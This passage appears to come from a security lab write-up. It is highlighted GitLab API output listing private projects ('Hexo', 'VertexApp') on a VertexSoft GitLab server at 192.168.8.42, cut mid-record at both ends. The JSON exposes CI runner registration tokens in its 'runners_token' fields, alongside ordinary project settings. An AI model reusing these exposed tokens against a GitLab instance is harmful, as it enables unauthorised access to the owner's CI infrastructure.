string">"2024-07-12T17:03:43.667Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-17T05:42:29.243Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941cVxxrGfbYCRyHzGyNtRE"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">4</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"Hexo"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"Hexo"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / Hexo"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"hexo"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/hexo"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:31.691Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"master"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/hexo.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/hexo.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/hexo"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/hexo/-/blob/master/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:31.661Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/members"</span><span class="token punctuation">,</span>            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/4/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T17:01:32.184Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token string">"gitlab_project"</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"finished"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">"&lt;p data-sourcepos=\"1:1-1:4\" dir=\"auto\">Hexo&lt;/p>"</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:01:32.535Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR1348941CyxAy3dnsudA95t35ucx"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">40</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token null keyword">null</span>            <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>    <span class="token punctuation">&#123;</span>        <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">3</span><span class="token punctuation">,</span>        <span class="token property">"description"</span><span class="token operator">:</span> <span class="token string">"VertexSoft Internal Employee Service App"</span><span class="token punctuation">,</span>        <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexApp"</span><span class="token punctuation">,</span>        <span class="token property">"name_with_namespace"</span><span class="token operator">:</span> <span class="token string">"VertexSoft / VertexApp"</span><span class="token punctuation">,</span>        <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexapp"</span><span class="token punctuation">,</span>        <span class="token property">"path_with_namespace"</span><span class="token operator">:</span> <span class="token string">"vertexsoft/vertexapp"</span><span class="token punctuation">,</span>        <span class="token property">"created_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:59.905Z"</span><span class="token punctuation">,</span>        <span class="token property">"default_branch"</span><span class="token operator">:</span> <span class="token string">"master"</span><span class="token punctuation">,</span>        <span class="token property">"tag_list"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"topics"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"ssh_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"git@192.168.8.42:vertexsoft/vertexapp.git"</span><span class="token punctuation">,</span>        <span class="token property">"http_url_to_repo"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexapp.git"</span><span class="token punctuation">,</span>        <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexapp"</span><span class="token punctuation">,</span>        <span class="token property">"readme_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/vertexsoft/vertexapp/-/blob/master/README.md"</span><span class="token punctuation">,</span>        <span class="token property">"forks_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"star_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"last_activity_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-11T17:00:59.877Z"</span><span class="token punctuation">,</span>        <span class="token property">"namespace"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"id"</span><span class="token operator">:</span> <span class="token number">2</span><span class="token punctuation">,</span>            <span class="token property">"name"</span><span class="token operator">:</span> <span class="token string">"VertexSoft"</span><span class="token punctuation">,</span>            <span class="token property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/3/members"</span><span class="token punctuation">,</span>       